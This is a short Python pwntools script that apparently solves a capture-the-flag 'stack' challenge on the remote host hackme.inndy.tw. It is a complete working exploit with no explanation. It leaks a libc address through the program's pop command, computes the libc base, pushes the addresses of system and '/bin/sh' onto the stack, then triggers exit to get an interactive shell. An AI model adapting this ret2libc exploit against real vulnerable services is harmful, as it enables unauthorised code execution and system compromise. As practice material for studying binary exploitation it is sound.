from pwn import *
context.log_level = 'debug'

conn = remote('hackme.inndy.tw',7716)
libc = ELF('./libc-2.23.so.i386')

def pop():
    conn.sendline('p')
    conn.recvuntil('Pop -> ')
    val =  conn.recvuntil('\n')[:-1]
    conn.recvuntil('>>\n')
    return val

def push(val):
    conn.sendline('i '+val)
    conn.recvuntil('Cmd >>\n')

def Exit():
    conn.sendline('x')

pop()
t = pop()
push(t)
push('93')
libc_base = int(pop()) + (1<<32) - libc.symbols['__libc_start_main'] - 246

libc_base = libc_base - libc_base%0x100
print libc_base
sys_addr = libc_base + libc.symbols['system'] - (1<<32)
binsh_addr = libc_base + libc.search('/bin/sh').next() - (1<<32)

push(str(sys_addr))
push('1')
push(str(binsh_addr))
Exit()


conn.interactive()